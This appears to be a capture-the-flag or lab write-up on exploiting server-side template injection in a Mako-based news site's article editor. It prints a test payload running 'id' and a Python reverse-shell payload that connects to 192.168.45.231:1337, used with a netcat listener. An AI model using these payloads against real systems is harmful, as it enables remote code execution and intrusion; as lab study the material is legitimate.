Upon clicking `Admin Dashboard` this leads us to `Create a  New Article`
![[Pasted image 20241208022740.png]]
this brings us to this field - where `mako` is being utilized for `templating`
![[Pasted image 20241208022820.png]]
a simple google search shows us that `mako` utilizes python
![[Pasted image 20241208022911.png]]
utilizing `hacktricks mako` gives us a payload to test for `SSTI`
![[Pasted image 20241208023108.png]]
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
this is what it looks like utilizing the `payload` - and hitting update
![[Pasted image 20241208023145.png]]
after hitting update lets navigate to the view of a generic `user` viewing the news page
![[Pasted image 20241208023246.png]]
this proves that it is utilizing `python` and we can try to utilize `revshells` to generate a simple `python shell` utilizing the `mako` formatting 
![[Pasted image 20241208025132.png]]
the payload used that gives a semi stable reverse shell
-  putting code in between `<%` and `%>` which is the required format for `mako`
```python
<%
import os,pty,socket;s=socket.socket();s.connect(("192.168.45.231",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
%>
${x}
```
submitting payload and ensuring to hit `update`
![[Pasted image 20241208025306.png]]
once the payload is in place - make sure to setup `nc` listener and brose to the `news` page that this would be displayed on - it doesnt load because its kicking off the `revshell`
![[Pasted image 20241208025413.png]]
flag
![[Pasted image 20241208025446.png]]